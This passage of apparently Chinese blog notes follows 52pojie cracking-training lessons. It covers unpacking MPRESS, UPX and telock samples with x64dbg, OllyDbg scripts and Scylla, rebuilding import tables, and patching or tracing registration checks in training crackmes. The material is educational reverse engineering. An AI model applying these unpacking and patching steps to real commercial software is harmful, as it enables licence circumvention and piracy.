rdi\n```\n\n但现在找不到，因为MPRESS把壳段跳到OEP的那部分代码给压缩了，要等它解压到那部分代码才能找到。\n\n暂时先不管，单步跟踪试一下，到达一个跨区段的跳转`14001BBA7`。下面是空代码，上面有pop指令(但不是pop上面那几句)，很像UPX。\n\n```asm\n000000014001BB9A | 41:5F                    | pop r15                                 |\n000000014001BB9C | 41:5E                    | pop r14                                 |\n000000014001BB9E | 41:5D                    | pop r13                                 |\n000000014001BBA0 | 41:5C                    | pop r12                                 |\n000000014001BBA2 | 5F                       | pop rdi                                 |\n000000014001BBA3 | 5E                       | pop rsi                                 |\n000000014001BBA4 | 5D                       | pop rbp                                 |\n000000014001BBA5 | 5B                       | pop rbx                                 |\n000000014001BBA6 | C3                       | ret                                     |\n000000014001BBA7 | E9 1F00FFFF              | jmp demo.14000BBCB                      |\n000000014001BBAC | 54                       | push rsp                                |\n000000014001BBAD | 54                       | push rsp                                |\n000000014001BBAE | FE                       | ???                                     |\n000000014001BBAF | FF                       | ???                                     |\n000000014001BBB0 | FF                       | ???                                     |\n000000014001BBB1 | FF                       | ???                                     |\n000000014001BBB2 | FF                       | ???                                     |\n000000014001BBB3 | FF00                     | inc dword ptr ds:[rax]                  |\n000000014001BBB5 | 0000                     | add byte ptr ds:[rax],al                |\n000000014001BBB7 | 004D 73                  | add byte ptr ss:[rbp+73],cl             |\n000000014001BBBA | 0000                     | add byte ptr ds:[rax],al                |\n000000014001BBBC | 0000                     | add byte ptr ds:[rax],al                |\n```\n\n```asm\n41 5F 41 5E 41 5D 41 5C 5F 5E 5D 5B C3\n```\n\n执行完`jmp`后，MPRESS完成了第一次解压。\n\n```asm\n000000014000BBCB | 48:83EC 28               | sub rsp,28                              |\n000000014000BBCF | 48:0300                  | add rax,qword ptr ds:[rax]              |\n000000014000BBD2 | 0AC0                     | or al,al                                |\n000000014000BBD4 | 0F85 85000000            | jne demo.14000BC5F                      |\n000000014000BBDA | 48:2D 00100000           | sub rax,1000                            |\n```\n\n继续单步，到下面这一步跑飞，重载，再次运行到这里时F7进去这个call指令。\n\n```asm\n000000014000BBFB | E8 09000000              | call demo.14000BC09                     |;进去\n```\n\n再次跑飞，再进去单步\n\n```asm\n000000014000BC14 | E8 0F000000              | call demo.14000BC28                     |;进去\n```\n\n运行到此处，这几条pop与开头几条push对应，并且`jmp`是个大跳转。\n\n```asm\n000000014000BCD5 | 41:58                    | pop r8                                  |\n000000014000BCD7 | 5A                       | pop rdx                                 |\n000000014000BCD8 | 59                       | pop rcx                                 |\n000000014000BCD9 | 5B                       | pop rbx                                 |\n000000014000BCDA | 5E                       | pop rsi                                 |\n000000014000BCDB | 5F                       | pop rdi                                 |\n000000014000BCDC | E9 4F54FFFF              | jmp demo.140001130                      |\n```\n\n```asm\n41 58 5A 59 5B 5E 5F\n```\n\n执行这个跳转，这里就是64位的VS2013编译出来的OEP。\n\n```asm\n0000000140001130 | 48:83EC 28               | sub rsp,28                              | OEP\n0000000140001134 | E8 7B180000              | call demo.1400029B4                     |\n0000000140001139 | 48:83C4 28               | add rsp,28                              |\n000000014000113D | E9 02000000              | jmp demo.140001144                      |\n0000000140001142 | CC                       | int3                                    |\n0000000140001143 | CC                       | int3                                    |\n```\n\n用Scylla将程序dump再fix dump，完成脱壳。\n\n用脚本找OEP\n\n```asm\nerun\nfind rip,\"415F415E415D415C5F5E5D5BC3\"\t\t//搜索二进制\nmov first_jmp,$result\t\t\t\t\t\t//first_jmp=41(first_jmp指向pop r15那一行)\t\t\t\t\t\t\nadd first_jmp,D\t\t\t\t\t\t\t\t//first_jmp=first_jmp+D=E9(加上0xD个偏移到达jmp)\nbp first_jmp\t\t\t\t\t\t\t\t//在jmp下断\nerun\t\t\t\t\t\t\t\t\t\t//运行\nbc\t\t\t\t\t\t\t\t\t\t\t//取消断点\nsti\t\t\t\t\t\t\t\t\t\t\t//F8\nfind rip,\"41585A595B5E5F\"\nmov second_jmp,$result\nadd second_jmp,7\nbp second_jmp\nerun\nbc\nsti\t\t\t\t\t\t\t\t\t\t\t//OEP\nret\n```\n\n在脚本窗口中，右键->载入脚本，按空格直接运行脚本。\n\n很简单的一个破解，搜索字符串改个跳转即可，右键->补丁->修补文件，后缀名自己加上。\n\n如果是追码也很简单\n\n```asm\n000000014000104C | FF15 CEB10000            | call qword ptr ds:[<&GetDlgItemTextA>]  |\n0000000140001052 | 48:8D15 C7470100         | lea rdx,qword ptr ds:[140015820]        |\n0000000140001059 | 48:8D0D 88020100         | lea rcx,qword ptr ds:[1400112E8]        | 00000001400112E8:\"Fuck L4Nce\"\n0000000140001060 | E8 9B040000              | call demo_dump_scy.140001500            |\n0000000140001065 | 48:8BCB                  | mov rcx,rbx                             |\n0000000140001068 | 85C0                     | test eax,eax                            |\n000000014000106A | 75 13                    | jne demo_dump_scy.14000107F             |\n000000014000106C | 45:33C9                  | xor r9d,r9d                             |\n000000014000106F | 4C:8D05 7E020100         | lea r8,qword ptr ds:[1400112F4]         | r8:&\"吚x\\n€|$@\", 00000001400112F4:\"Boom!\"\n0000000140001076 | 48:8D15 83020100         | lea rdx,qword ptr ds:[140011300]        | 0000000140011300:\"Congratulations! You have successfully fucked L4Nce\"\n000000014000107D | EB 14                    | jmp demo_dump_scy.140001093             |\n000000014000107F | 41:B9 10000000           | mov r9d,10                              |\n0000000140001085 | 4C:8D05 AC020100         | lea r8,qword ptr ds:[140011338]         | r8:&\"吚x\\n€|$@\", 0000000140011338:\"Boomshakalaka\"\n000000014000108C | 48:8D15 B5020100         | lea rdx,qword ptr ds:[140011348]        | 0000000140011348:\"You Failed!\"\n```\n\n在`GetDlgItemTextA`函数下断，这个是获取我们输入的字符串。两次F9运行至主程序，输入假码提交，停在断点处。接下来单步\n\n```asm\n000000014000104C | FF15 CEB10000            | call qword ptr ds:[<&GetDlgItemTextA>]  |\n0000000140001052 | 48:8D15 C7470100         | lea rdx,qword ptr ds:[140015820]        | rdx:\"hhhhhhh\", 0000000140015820:\"hhhhhhh\"\n0000000140001059 | 48:8D0D 88020100         | lea rcx,qword ptr ds:[1400112E8]        | rcx:\"Fuck L4Nce\", 00000001400112E8:\"Fuck L4Nce\"\n0000000140001060 | E8 9B040000              | call demo_dump_scy.140001500            |\n0000000140001065 | 48:8BCB                  | mov rcx,rbx                             | rcx:\"Fuck L4Nce\"\n0000000140001068 | 85C0                     | test eax,eax                            |\n000000014000106A | 75 13                    | jne demo_dump_scy.14000107F             |\n000000014000106C | 45:33C9                  | xor r9d,r9d                             |\n000000014000106F | 4C:8D05 7E020100         | lea r8,qword ptr ds:[1400112F4]         | 00000001400112F4:\"Boom!\"\n0000000140001076 | 48:8D15 83020100         | lea rdx,qword ptr ds:[140011300]        | rdx:\"hhhhhhh\", 0000000140011300:\"Congratulations! You have successfully fucked L4Nce\"\n```\n\n很明显就是我们输入的字符串与`Fuck L4Nce`比较。\n\n如果想在64位下做补丁工具，推荐用IDA。将脱完壳的程序载入IDA，在Options->General勾选地址前缀和填上要显示的字节个数。\n\n{% asset_img 地址.png 地址和字节 %}\n\n在汇编窗口找到成功与失败的分岔路。\n\n{% asset_img jnz.png 分岔路 %}\n\n选中`jnz`指令，在界面上Edit->Patch program->Assemble，将jnz改为nop，由于jnz有两个字节，所以要连续修改两个nop。或者Edit->Patch program->Change word，写入0x9090。\n\n{% asset_img nop.png nop掉 %}\n\n现在可以看到，上面那块与左边那块合并了，而右边那块被独立出来，没有箭头指向右边那块了。\n\n然后Edit->Patch program->Apply patches to input file，输出窗口提示应用成功。\n\n{% asset_img 输出窗口.png 输出窗口 %}\n\n课后作业几乎与课程例子一模一样，所以不记笔记了。\n\n","categories":["Windows逆向"],"tags":["IDA","x64dbg","吾爱破解培训"]},{"title":"第八九课——深入浅出探讨脱壳细节","url":"/posts/4b9d65e0.html","content":"\n在做第五六课的打补丁作业时，遇到了在不脱壳的情况下修改程序。在复制到可执行文件时提示“无法定位数据”。这是因为程序加壳后，代码段显示全是空代码，我们修改代码时，系统执行将某代码1修改为某代码2，但系统在代码段找不到某代码1，所以提示“无法定位数据”。\n\n但如果我们将程序脱壳了，就可在程序上随意修改，所以脱壳的重要性就体现出来了。脱壳毁一生，破解穷三代(bushi)。\n\n<!--more-->\n\n**脱壳细节**\n\n1. 找OEP(只是万里长征的第一步)\n2. dump\n\n- 无法读取进程内存:换工具(Scylla不错)\n\n3. 修复IAT\n\n- 在此OEP入口没有找到任何有用信息:在你使用的工具选项中取消勾选使用来自磁盘的PE文件,还是不行换工具(Scylla)\n- 无效函数\n  - 剪切指针\n  - 跟踪级别1\n  - 跟踪级别3\n  - 插件跟踪\n  - 手动查找输入表(在OD中找)\n  - OD脚本\n\n程序的加载过程：程序被加载进内存里->系统根据程序的导入表，填充程序所需的API函数到程序的内存里(IAT：导入地址表)。\n\n壳：程序的导入表是静态可见的，包含了导入的DLL名称和其导入函数(用exeinfo可看)，有些壳会在加壳的时候把导入表结构取出，然后自行加密，或改变结构。这时系统找不到导入表，也就无法给程序填充所需的API函数地址。加过壳的程序一定是可以运行的，所以很明显这个填充过程被取代了，这个过程会在壳段完成。如果脱壳时直接dump，程序的导入表也就不在了，IAT所填充的函数地址是当前系统的地址，所以这个程序可能只能在脱壳的机器上运行。为了解决这个问题，import REC导入IAT地址值生成一份导入表，然后让程序使用新的导入表，程序可跨系统，在各个机器上与运行。但有些加密壳会使import REC失效，导致导入表无法修复。\n\n如何使import REC失效：\n\n```\n本来的函数调用\ncall addr_api\n\n某些壳会修改代码\ncall packspace(packspace:junkcode/无效操作/vm)\njmp addr_api\n```\n\n也就是间接调用API函数，使工具无法修复导入表。\n\n如何使import REC失效变为有效，将间接调用修改为直接调用，API有很多，所以不可能人工一个个API函数修改，而是用OD脚本。\n\n# 1. 熟悉OD脚本工具的使用\n\n在反汇编窗口右键->Script Functions->脚本运行窗口(或插件->ODbgScript->脚本运行窗口)打开脚本运行窗口。\n\n（1）右键->载入脚本，将写好的脚本打开调试脚本。\n\n（2）右键->运行脚本，将写好的脚本打开直接运行，不调试。\n\n编写OD脚本的工具：\n\n脚本的指令：\n\n```asm\nsti \t\t\t\t;F7\nsto\t\t\t\t\t;F8\nbp 地址\t   \t\t\t;F2\nrun\t\t\t\t\t;F9\nesto\t\t\t\t;Shift+F9\ngmi eip,CODEBASE\t;获取代码段地址\n```\n\n简单写一个脚本尝试一下，脚本通常为.txt和.osc格式。\n\n```asm\nsti\nsti\nsti\n```\n\n载入脚本后，会自动运行脚本的第1行，按Tab键执行脚本的下一行，按空格键直接运行脚本。\n\n{% asset_img 载入脚本.png 载入脚本 %}\n\n# 2. UPX的大表哥\n\n用普通的方法(单步跟踪、ESP定律、两次内存镜像等)就能找到OEP，关键在于修复IAT。\n\n1. 用importREC获取输入表，发现全都是无效函数，用跟踪级别1就可全部修复完。\n\n2. 编写OD脚本(这节课的重点)，OD脚本是基于汇编语言编写的。\n\n因为这个是UPX壳，有一个大跳转跳到OEP处。\n\n```asm\n00457765  - E9 4266FCFF     jmp upx的大?0041DDAC\n```\n\n编写到OEP的脚本\n\n```asm\nbp 00457765\t\t\t\t;在jmp下断点\nrun\t\t\t\t\t\t;F9运行至断点处\nsti\t\t\t\t\t\t;F7步入\nMSG \"OEP到了\"\t\t\t   ;弹窗提示OEP到了\nret\t\t\t\t\t\t;退出脚本\n```\n\n直接运行脚本\n\n{% asset_img 脚本弹窗.png 脚本弹窗 %}\n\n{% asset_img 脚本结束.png 脚本结束 %}\n\n但这个脚本仅限于当前程序且无重定位(如果当前程序有重定位，取消它的重定位即可)。相对来说，ESP定律的脚本更通用。\n\nESP定律是利用堆栈平衡找OEP的手段，首先要执行一条压栈指令来改变栈。等以后再次读取这个栈内容的时候，就说明有栈平衡的迹象，很有可能是栈的恢复。一般来说，压缩壳只有一次恢复，然后就到OEP了，利用这个特性来找OEP。\n\n```asm\nsti\t\t\t\t\t;执行pushad\nbphws esp,\"r\"\t\t;给esp下硬件断点\nrun\n```\n\n执行完3行脚本后运行到`00457758`。还没到达OEP。\n\n```asm\n00457758    8D4424 80       lea eax,dword ptr ss:[esp-0x80]\n0045775C    6A 00           push 0x0\n0045775E    39C4            cmp esp,eax\n00457760  ^ 75 FA           jnz short upx的大?0045775C\n00457762    83EC 80         sub esp,-0x80\n00457765  - E9 4266FCFF     jmp upx的大?0041DDAC\n```\n\n再改进一下\n\n```asm\nsti\t\t\t\t\t;执行pushad\nbphws esp,\"r\"\t\t;给esp下硬件断点\nrun\nsti\nsti\nsti\t\t\t\t\t;到了jnz\nbp eip\n@LOOP:\nrun\ncmp esp,eax\njnz @LOOP\nsti\nsti\nsti\t\t\t\t\t;到OEP\nret\n```\n\nUPX的壳段代码是差不多的，这个脚本可以用来找这个UPX版本所有加壳程序的OEP，而且允许程序有重定位。\n\n到OEP的下一步是找IAT，除了一些特别变态的加密壳比如：Themida，SE，VMProtect，都可以找指令为`call dword...`(FF 15)，`jmp dword...`(FF 25)来找IAT。\n\n{% asset_img 找IAT.png 找IAT %}\n\n发现注释是空的，在反汇编窗口的那条指令跟进去，`push API函数地址`\n\n```asm\n00401077    FF15 28204300   call dword ptr ds:[0x432028]\n```\n\n```asm\n0096033C    68 88401877     push comctl32.InitCommonControlsEx\n00960341    C3              retn\n```\n\n这两条指令相当于`jmp InitCommonControlsEx `。很明显，把API函数调用改成自己的函数，然后在自己的函数里跳到真实的API地址。\n\n一般来说，间接调用API函数有两种方法：\n\n- 在指令二进制，直接带有地址(push)\n- 根据当前的eip加上指令中的偏移算出地址(jmp)\n\n虽然它注释是空的，但可以知道IAT的起始位置前面全是空数据，IAT结束时是与用户函数分隔。可以推测IAT起始地址为`432000`，结束地址为`432554`。\n\n继续改进脚本\n\n```asm\nmov iat_b,00432000\nmov iat_e,00432554\nsti\t\t\t\t\t;执行pushad\nbphws esp,\"r\"\t\t;给esp下硬件断点\nrun\nsti\nsti\nsti\t\t\t\t\t;到了jnz\nbp eip\n@LOOP:\nrun\ncmp esp,eax\njnz @LOOP\nsti\nsti\nsti\t\t\t\t\t;到OEP\n@IAT_LOOP:\nmov iat,[iat_b]\t\t;比如iat=[432000]\ncmp iat,0\t\t\t;修改不了空数据，所以要跳过\nje @NEXT_LOOP\nmov api,[iat+1]\t\t;比如api=[[432000]+1]=[68 88401877+1]=88401877\nmov [iat_b],api\t\t;重建iat\n@NEXT_LOOP:\nadd iat_b,4\ncmp iat_b,iat_e\njne @IAT_LOOP\nret\n```\n\n运行完脚本再dump下来完成脱壳。\n\n如果修改一个就不用脚本这么麻烦，双击下面这条指令复制API函数地址，去到对应的数据窗口地址修改其数值，右键->修改，粘贴API函数地址。\n\n```asm\n0096033C    68 88401877     push comctl32.InitCommonControlsEx\n```\n\n```asm\n00432028  0096033C\n修改为\n00432028  77184088  comctl32.InitCommonControlsEx\n```\n\n此时就可看到API函数了。\n\n# 3. 真假难辨\n\n用单步跟踪、两次内存镜像等都能找到OEP\n\n```asm\n00446021  /.  55            push ebp                                 ;  OEP\n00446022  |.  8BEC          mov ebp,esp\n00446024  |.  6A FF         push -0x1\n00446026  |.  68 70C04600   push 真假难辩.0046C070\n0044602B  |.  68 5CA84400   push 真假难辩.0044A85C                       ;  SE 处理程序安装\n00446030  |.  64:A1 0000000>mov eax,dword ptr fs:[0]\n```\n\n不会找IAT啊...不会写OD脚本...\n\n# 4. 课后作业\n\n查壳是telock的壳，用最后一次异常法到达OEP，不会去第一课找telock壳详解。也可以三次内存镜像`.text`->`.rdata`->`.text`直达OEP。\n\n```asm\n0045D4F6    55              push ebp\n0045D4F7    8BEC            mov ebp,esp\n0045D4F9    6A FF           push -0x1\n0045D4FB    68 28704800     push 第八九课.00487028\n0045D500    68 D4024600     push 第八九课.004602D4\n```\n\n方法一：重建IAT用插件跟踪，剩余4无效指针，直接剪切。程序正常运行。\n\n方法二：用OD脚本修复IAT，起始位置为`47D000`，结束位置为`47D6A0`。\n\n下面这个脚本很容易看得懂\n\n```asm\n;到达OEP才能用这个脚本\nmov iat_s, 0047d024\nmov iat_e, 0047d16c\n@LOOP1:\nmov iat,iat_s+663CFE\nmov [iat_s],[iat]\nadd iat_s,4\ncmp iat_s,iat_e\njne @LOOP1\n \nmov iat_s,0047d16c\nmov iat_e,0047D374\n@LOOP2:\nmov iat,iat_s+644310\nmov [iat_s],[iat]\nadd iat_s,4\ncmp iat_s,iat_e\njne @LOOP2\n \nmov iat_s,0047D384\nmov iat_e,0047D390\n@LOOP3:\nmov iat,iat_s+6A2CCE\nmov [iat_s],[iat]\nadd iat_s,4\ncmp iat_s,iat_e\njne @LOOP3\n \nmov iat_s,0047D390\nmov iat_e,0047D600\n@LOOP4:\nmov iat,iat_s+654543\nmov [iat_s],[iat]\nadd iat_s,4\ncmp iat_s,iat_e\njne @LOOP4\n\nMSG \"IAT修复完成！\"\nret\n```\n\n拿@LOOP1来说，`0047d024`的数值为`00AE0000`，Alt+M进入找地址为`00AE0000`的数据段，开头是一大段杂乱的数据，后面是空数据，紧接着又一段有规律的数据，再接着空数据。这段有规律的数据都是以`77`开头的，猜测是dll领空的API函数地址。 而`0047d024`与`00AE0D22`相差`663CFE`，所以要加上偏移`663CFE`即可得到API函数地址。@LOOP2到@LOOP4都同理。\n\n```asm\n00AE0D20   00 00 C0 6D F0 77 56 D2 EF 77 1D AF EF 77 FF 82  ..續饂V绎w\u001dw\n00AE0D30   EF 77 17 6D F2 77 F1 7C EF 77 74 78 EF 77 D9 B4  飛\u0017m騱駖飛tx飛俅\n00AE0D40   EF 77 71 5A EF 77 6D E4 EF 77 EF 61 EF 77 E0 5F  飛qZ飛m滹w颽飛郷\n00AE0D50   EF 77 70 5B EF 77 79 6F EF 77 3D 99 EF 77 BE 99  飛p[飛yo飛=欙w緳\n00AE0D60   EF 77 18 89 EF 77 1A E8 EF 77 A0 C7 F1 77 BB 9D  飛\u0018夛w\u001a栾w犌駑粷\n00AE0D70   EF 77 86 77 EF 77 77 DE EF 77 0F 84 EF 77 78 ED  飛唚飛w揎w\u000f勶wx\n00AE0D80   EF 77 A5 61 EF 77 C1 61 EF 77 2A EB EF 77 D1 86  飛飛羇飛*腼w褑\n00AE0D90   EF 77 41 9D EF 77 EE BB EF 77 F3 D7 EF 77 83 9A  飛A濓w罨飛笞飛儦\n00AE0DA0   EF 77 15 90 EF 77 B8 D9 F1 77 3A 71 F0 77 3D 8D  飛\u0015愶w纲駑:q饂=\n00AE0DB0   EF 77 0A 70 EF 77 31 DB F0 77 6E F3 F0 77 D2 34  飛.p飛1垧wn箴w?\n00AE0DC0   F0 77 5A 3F F2 77 5E EA EF 77 84 8E EF 77 65 34  饂Z?騱^觑w剮飛e4\n00AE0DD0   F0 77 D8 8E EF 77 C1 DD F0 77 60 BE EF 77 F2 4E  饂貛飛凛饂`撅w騈\n00AE0DE0   F2 77 38 67 F2 77 D8 D3 F0 77 58 D3 F0 77 5F 6E  騱8g騱赜饂X羽w_n\n00AE0DF0   EF 77 60 83 EF 77 23 D3 EF 77 FA 6B EF 77 A0 7A  飛`冿w#语w鷎飛爖\n00AE0E00   EF 77 D6 6A EF 77 D1 AB EF 77 D3 B8 EF 77 36 86  飛謏飛勋飛痈飛6\n00AE0E10   EF 77 7A D8 EF 77 D7 D8 F1 77 E3 71 F0 77 81 BE  飛z仫w棕駑鉸饂伨\n00AE0E20   EF 77 4C 7B EF 77 BE 95 EF 77 2C D7 EF 77 77 06  飛L{飛緯飛,罪ww\u0006\n00AE0E30   F0 77 DB 5E EF 77 01 7C EF 77 79 7C EF 77 BA 92  饂踍飛\u0001|飛y|飛簰\n00AE0E40   EF 77 B7 E8 EF 77 29 5E EF 77 EA C3 F0 77 89 63  飛疯飛)^飛昝饂塩\n00AE0E50   F2 77 40 97 EF 77 06 98 EF 77 77 5D EF 77 A1 6A  騱@楋w\u0006橈ww]飛\n00AE0E60   EF 77 A1 DD EF 77 2D A4 EF 77 00 00 00 00 00 00  飛≥飛-わw......\n00AE0E70   00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................\n```\n\n用最后一次异常法到OEP和修复IAT，来自论坛苏紫方璇的脚本：(高级，看不懂就是了)\n\n```asm\nvar iat_b         ;iat起始位置\nvar iat_e         ;iat结束位置\nvar tmp           ;临时中转\nvar string        ;储存代码段自动跟踪命令\nvar oldesp        ;esp备份\nvar oldeip        ;eip备份\nvar codebegin     ;代码段起始地址\nvar codesize      ;代码段大小\n \ngmi eip,CODEBASE             ;获取代码段地址\nmov codebegin,$RESULT\ngmi eip,CODESIZE             ;获取代码段大小\nmov codesize,$RESULT\nadd codebegin,codesize       ;得到末尾地址\nmov string,\"eip < \"          ;构建自动跟踪指令\nadd string,codebegin\nmsg \"请取消所有的忽略异常\"\t;StrongOD中的skip some exceptions要勾选\nESTO\nESTO\nESTO\nESTO\nESTO\nESTO\nESTO                      ;最后一次异常法\nbphws [esp+4],\"x\"         ;Seh地址下硬件断点\nESTO                      ;Shift+F9\nbphwcall                  ;清除所有硬件断点\nTICND string              ;TICND \"eip < 47d000\"       ;tc eip<47d000\ncmt eip,\"程序入口点\"\nmsg \"找到入口点\"\n;IAT修复\nmov iat_b,0047D000\nmov iat_e,0047D6A0\nmov oldesp,esp           ;备份esp，eip\nmov oldeip,eip\n@ILoop:\nmov tmp,[iat_b]          ;tmp=原始iat表值\ncmp tmp,10000000\nja @Next                 ;若大于10000000就换下一个\ncmp tmp,00400000\nja @Start                ;若大于00400000就继续运行\ncmp tmp,0\njz @Next                 ;等于0就换下一个\n@Start:\nmov eip,tmp          \t;设定eip\nmov esp,oldesp       \t;恢复esp\nrtr                   \t;运行到返回\nmov [iat_b],[esp]      \t;修复IAT\n@Next:\nadd iat_b,4           \t;下一个iat\ncmp iat_b,iat_e       \t;判断是否结束\njnz @ILoop\nmov eip,oldeip        \t;恢复eip，esp\nmov esp,oldesp\nret\n```\n\n","categories":["Windows逆向"],"tags":["OllyDbg","吾爱破解培训"]},{"title":"第五六课——解除程序重启验证，程序打补丁","url":"/posts/bb44dc0.html","content":"\n# 1. 课前预习\n\n- 熟悉OD字符串插件的使用\n  右键或插件->中文搜索引擎->智能搜索，Ctrl+F搜索字符串。\n\n- 熟悉OD如何下断点\n  Ctrl+G，直接搜索API下断\n  Ctrl+N，输入表搜索API->右键->在每个参考上设置断点\n  利用插件，ApiBreak和API断点设置工具都可以\n\n<!--more-->\n\n- 熟悉procmon的使用\n  可以监控文件，注册表，网络，进线程信息\n  排除进程:Exclude\n  查看指定进程:Include\n\n- 熟悉文件操作API的使用\n  CreateFileA(W):创建文件\n  ReadFile:读取文件\n  WriteFile:写入文件\n  CloseHandle:关闭句柄\n  读取文件:CreateFile->ReadFile->CloseHandle\n  写入文件:CreateFile->WriteFile->CloseHandle\n\n- 熟悉注册表操作API的使用\n  创建注册表Key:RegCreateKey\n  打开注册表Key:RegOpenKey\n  查询注册表键值:RegQueryValueExA\n  写入注册表键值:RegSetValueEx\n\n# 2. 重启验证\n\n什么是重启验证\n\n- 重启验证顾名思义就是在程序启动时验证注册信息。 \n\n执行流程\n\n- 基本的执行流程：注册信息输入-->程序重启-->执行验证机制-->正常执行\n\n- 扩展的执行流程：注册信息输入-->执行部分验证机制/执行假验证机制-->程序重启-->执行真验证机制-->正常执行\n- 对于有经验的作者来说，可以在注册信息输入和程序重启之间加入假的验证机制，假的验证机制一般比较简单，比如说只是当单纯的明码比较，当我们输入假的注册码，程序一般会提示注册成功，此时程序就会知道我们是逆向者，在程序重启时就会假装注册成功，在执行程序功能时就会报错或是无反应，这就是所谓的暗桩。\n\n重启验证的类型\n\n- 重启验证根据写入信息位置的不同一般分两类，一类是将注册信息写入文件中，一类是将注册信息写入注册表中。\n\n定位关键代码\n\n1. 字符串定位\n   通过OD字符串插件扫描敏感字符串，一般出现的文件路径或是注册表路径都可能是验证信息的保存位置\n2. 监控工具定位\n   通过procmon等监控工具监控注册信息的写入位置\n3. API定位\n   通过定位CreateFile，RegCreateKey，GetPrivateProfileStringA等API来获取注册信息的写入位置\n\n# 3. 重启验证示例\n\n运行一下程序查看它的操作机制。\n\n{% asset_img 示例.png 示例 %}\n\n输入任意字符串，点击重启验证1，出现弹窗，在程序的本目录下生成一个.txt文件，程序退出。里面是我们输入的字符串。\n\n```\n888888888\n```\n\n再次，点击重启验证2，出现弹窗，在程序的本目录下生成一个.ini文件，程序退出。里面是我们输入的字符串。\n\n```\n[验证]\nKey=888888888\n```\n\n再次，点击重启验证3，出现弹窗，在本机注册表里写入信息，程序退出。徽标键+R打开运行窗口，输入`regedit`打开注册表，在下图看到输入的字符串。\n\n{% asset_img 注册表.png 注册表 %}\n\n将所有生成的文件和注册表信息删除，载入OD，搜索敏感字符串。\n\n{% asset_img 搜索字符串.png 搜索字符串 %}\n\n首先看重启验证1，双击进入反汇编代码，找到函数开头下断。运行，输入假码，选择重启验证1，OD停在断点处。F8往下走走，遇到call先用enter探探路再考虑是否跟进去。这个call里面有很多API函数，程序经过这条指令后，eax变成我们输入的字符串，所以这个函数是取出输入框里的字符串。\n\n```asm\n0040275B  |.  E8 C8590100   call 52PoJie?00418128;eax=888888888\n00402760  |.  8B45 EC             mov eax,[local.5]\n00402763  |.  8378 F4 00          cmp dword ptr ds:[eax-0xC],0x0;判断字符串是否为空\n00402767  |.  74 74               je short 52PoJie?004027DD\n```\n\n继续F8，到`CreateFileA`函数，创建一个52Pojie.txt文件。\n\n```asm\n00402769  |.  6A 00               push 0x0                                     ; /hTemplateFile = NULL\n0040276B  |.  6A 00               push 0x0                                     ; |Attributes = 0\n0040276D  |.  6A 02               push 0x2                                     ; |Mode = CREATE_ALWAYS\n0040276F  |.  6A 00               push 0x0                                     ; |pSecurity = NULL\n00402771  |.  6A 01               push 0x1                                     ; |ShareMode = FILE_SHARE_READ\n00402773  |.  68 00000040         push 0x40000000                              ; |Access = GENERIC_WRITE\n00402778  |.  FFB6 BC000000       push dword ptr ds:[esi+0xBC]                 ; |FileName = \"C:\\Documents and Settings\\Administrator\\桌面\\吾爱破解培训第五课例子\\52Pojie.txt\"\n0040277E  |.  FF15 10345400       call dword ptr ds:[<&KERNEL32.CreateFileA>]  ; \\CreateFileA\n```\n\nF8到`WriteFileA`函数，将我们输入的字符串写入52Pojie.txt文件中。\n\n```asm\n004027AD  |> \\6A 00               push 0x0                                     ; /pOverlapped = NULL\n004027AF  |.  8D45 E8             lea eax,[local.6]                            ; |\n004027B2  |.  50                  push eax                                     ; |pBytesWritten = 00000009\n004027B3  |.  57                  push edi                                     ; |nBytesToWrite = 0x9\n004027B4  |.  51                  push ecx                                     ; |Buffer = 00161100\n004027B5  |.  56                  push esi                                     ; |hFile = 000000D4 (window)\n004027B6  |.  FF15 2C345400       call dword ptr ds:[<&KERNEL32.WriteFile>]    ; \\WriteFile\n```\n\n继续F8，`004027C9`执行弹窗，退出，关闭句柄。再之后就退出程序了。\n\n```asm\n004027C0  |.  6A 00               push 0x0\n004027C2  |.  6A 00               push 0x0\n004027C4  |.  68 60465400         push 52PoJie?00544660                        ;  你选择的验证类型是重启验证1\n004027C9  |.  E8 B17F0000         call 52PoJie?0040A77F\n004027CE  |.  6A 00               push 0x0                                     ; /ExitCode = 0x0\n004027D0  |.  FF15 40385400       call dword ptr ds:[<&USER32.PostQuitMessage>>; \\PostQuitMessage\n004027D6  |>  56                  push esi                                     ; /hObject = 000000D4 (window)\n004027D7  |.  FF15 24345400       call dword ptr ds:[<&KERNEL32.CloseHandle>]  ; \\CloseHandle\n```\n\n因为它是重启验证，所以在这个函数中找不到验证算法。而是在主程序出来前就已经运行验证算法了。再次打开程序时，程序会在相应的.txt，.ini或注册表里找注册码进行验证。\n\n重载，找敏感字符串有关“52Pojie.txt”的双击进去反汇编代码，在函数开头下断。F9运行至断点处，F8路过这个函数\n\n```asm\n00402AE2  |.  50            push eax                                 ; /Buffer = 00174B68\n00402AE3  |.  68 04010000   push 0x104                               ; |BufSize = 104 (260.)\n00402AE8  |.  FF15 14345400 call dword ptr ds:[<&KERNEL32.GetCurrent>; \\GetCurrentDirectoryA 获取当前目录\n```\n\n继续F8，发现这个跳转跳过了“验证通过”。\n\n```asm\n00402BC0  |.  E8 1BF4FFFF   call 52PoJie?00401FE0\n00402BC5  |.  85C0          test eax,eax\n00402BC7  |. /74 15         je short 52PoJie?00402BDE\n00402BC9  |. |8B8D DCFEFFFF mov ecx,[local.73]\n00402BCF  |. |68 18465400   push 52PoJie?00544618                    ;  验证通过\n00402BD4  |. |E8 E7980100   call 52PoJie?0041C4C0\n00402BD9  |. |BB 01000000   mov ebx,0x1\n00402BDE  |> \\8B85 E0FEFFFF mov eax,[local.72]\n```\n\n如果是爆破的话，直接将跳转指令nop掉。保存，运行一下，成功。\n\n{% asset_img nop.png 验证1通过 %}\n\n如果想逆向分析，跟进去第1行的call指令，那个就是算法函数。\n\n```asm\n00401FF7  |.  56            push esi                                 ; /hTemplateFile = 00174B68\n00401FF8  |.  56            push esi                                 ; |Attributes = ARCHIVE|TEMPORARY|COMPRESSED|174248\n00401FF9  |.  6A 03         push 0x3                                 ; |Mode = OPEN_EXISTING\n00401FFB  |.  56            push esi                                 ; |pSecurity = 00174B68\n00401FFC  |.  6A 01         push 0x1                                 ; |ShareMode = FILE_SHARE_READ\n00401FFE  |.  6A 01         push 0x1                                 ; |Access = 1\n00402000  |.  FFB1 BC000000 push dword ptr ds:[ecx+0xBC]             ; |FileName = \"C:\\Documents and Settings\\Administrator\\桌面\\吾爱破解培训第五课例子\\52Pojie.txt\"\n00402006  |.  FF15 10345400 call dword ptr ds:[<&KERNEL32.CreateFile>; \\CreateFileA 